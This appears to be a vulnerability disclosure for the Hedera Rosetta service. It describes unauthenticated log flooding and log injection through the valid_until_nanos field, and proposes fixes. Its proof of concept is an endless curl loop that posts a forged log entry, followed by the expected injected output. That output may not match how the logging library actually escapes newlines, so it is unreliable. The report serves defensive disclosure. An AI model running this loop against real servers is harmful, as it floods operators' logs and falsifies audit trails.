### Title
Unauthenticated Log Flooding and Log Injection via Attacker-Controlled `valid_until_nanos` in `getTransactionTimestampProperty()`

### Summary
The `/construction/payloads` endpoint accepts unauthenticated requests and passes the raw, unsanitized `valid_until_nanos` metadata value directly into `log.Errorf()` format arguments on every validation failure. Because there is no application-level rate limiting in the Rosetta Go service, an unprivileged attacker can send an unbounded stream of requests with crafted values, flooding server logs with error-level entries containing attacker-controlled content, including injected fake log lines via embedded newlines.

### Finding Description

**Exact code path:**

`rosetta/app/services/construction_service.go`, function `getTransactionTimestampProperty()`, lines 393–430.

```go
// line 396: attacker supplies metadata["valid_until_nanos"]
validUntil, err = c.getIntMetadataValue(metadata, metadataKeyValidUntilNanos)
if err != nil {
    log.Errorf("Invalid valid until %s", metadata[metadataKeyValidUntilNanos])  // line 401
    err = errors.ErrInvalidArgument
    return
}

validDurationSeconds = maxValidDurationSeconds
validStartNanos = validUntil - maxValidDurationNanos
if validStartNanos <= 0 {
    log.Errorf("Valid start nanos determined from valid until %s is not positive",  // lines 409-410
        metadata[metadataKeyValidUntilNanos])
    err = errors.ErrInvalidArgument
}
```

`metadata[metadataKeyValidUntilNanos]` is the raw value supplied by the caller in the HTTP request body. It is never sanitized before being passed as the `%s` argument to `log.Errorf`. In Go's `logrus` (imported as `log "github.com/sirupsen/logrus"`), `%s` formats the value as-is, including any embedded newline characters, which allows injection of additional fake log lines.

**Root cause:** No input sanitization of user-supplied metadata values before logging, combined with no application-level rate limiting on the `ConstructionPayloads` endpoint.

**Exploit flow:**
1. Attacker sends POST to `/construction/payloads` with `metadata.valid_until_nanos` set to a non-numeric string (e.g., `"abc"`) or a small integer that causes `validStartNanos <= 0` (e.g., `"1"`).
2. `getTransactionTimestampProperty()` calls `log.Errorf(...)` with the attacker-controlled value.
3. The function returns `ErrInvalidArgument` to the caller, which returns HTTP 400 — the attacker receives immediate feedback confirming the trigger.
4. Attacker repeats at maximum throughput.

**Why existing checks fail:**

The only rate-limiting defense is the optional Traefik middleware defined in `charts/hedera-mirror-rosetta/templates/middleware.yaml` (line 3: `{{ if and .Values.global.middleware .Values.middleware }}`). This middleware is **conditionally deployed** — it is only active when both `global.middleware` and `middleware` Helm values are set. It is not enforced at the application layer. Deployments without Traefik, or with `global.middleware=false`, have zero rate limiting. Even when active, the configured rate of `average: 10` per host (`values.yaml` lines 157–160) still permits 10 error log lines per second per source host, and an attacker using multiple IPs or rotating hosts bypasses the per-host criterion entirely.

There is no authentication requirement on the Rosetta construction endpoints.

### Impact Explanation

**Log flooding:** Each invalid request produces one or two `ERROR`-level log lines. At sustained rates, this buries legitimate error signals, degrading operator visibility into real incidents. On systems with log-size-based rotation or fixed-size log storage, disk exhaustion is possible.

**Log injection:** Because `logrus` formats `%s` arguments verbatim, a value such as:
```
abc\ntime="2024-01-01T00:00:00Z" level=error msg="Admin credentials rotated by system"
```
produces two distinct log lines, the second being entirely fabricated. This can mislead forensic analysis, corrupt audit trails, and cause false alerts in log-monitoring pipelines that parse structured log output.

Severity: Medium — no direct economic damage to network users, but operational integrity of the node operator is degraded.

### Likelihood Explanation

The attack requires only HTTP access to the Rosetta API port, which is the intended public interface. No credentials, tokens, or prior knowledge of internal state are needed. The trigger is a single malformed field in a standard JSON request body. The attack is trivially scriptable (`curl` in a loop), repeatable indefinitely, and produces immediate confirmation via the HTTP 400 response. Any internet-exposed Rosetta deployment without Traefik rate limiting is fully exposed.

### Recommendation

1. **Sanitize before logging:** Strip or escape control characters (especially `\n`, `\r`) from user-supplied metadata values before passing them to any log call. A minimal fix:
   ```go
   sanitized := strings.ReplaceAll(fmt.Sprintf("%v", metadata[metadataKeyValidUntilNanos]), "\n", "\\n")
   log.Errorf("Invalid valid until %s", sanitized)
   ```
2. **Apply application-level rate limiting:** Add a per-IP or global request rate limiter in the Go HTTP middleware stack, independent of infrastructure configuration, so protection is always present regardless of deployment topology.
3. **Reduce log verbosity for client errors:** Consider logging invalid user input at `WARN` or `DEBUG` level rather than `ERROR`, or suppress the value entirely (log only `"Invalid valid_until_nanos value"` without echoing the input), to limit both noise and injection surface.

### Proof of Concept

```bash
# Trigger log flooding with log injection payload
# Replace HOST with the Rosetta service address

PAYLOAD='{
  "network_identifier": {"blockchain":"Hedera","network":"mainnet"},
  "operations": [],
  "metadata": {
    "node_account_id": "0.0.3",
    "valid_until_nanos": "INJECTED\ntime=\"2099-01-01T00:00:00Z\" level=error msg=\"Fake critical alert\""
  }
}'

while true; do
  curl -s -o /dev/null -X POST http://HOST:8082/construction/payloads \
    -H 'Content-Type: application/json' \
    -d "$PAYLOAD"
done
```

**Expected server log output (one iteration):**
```
time="..." level=error msg="Invalid valid until INJECTED"
time="2099-01-01T00:00:00Z" level=error msg="Fake critical alert"
```

The second line is entirely attacker-fabricated and indistinguishable from a genuine log entry. Running the loop at network speed produces unbounded log growth with no application-layer enforcement to stop it.
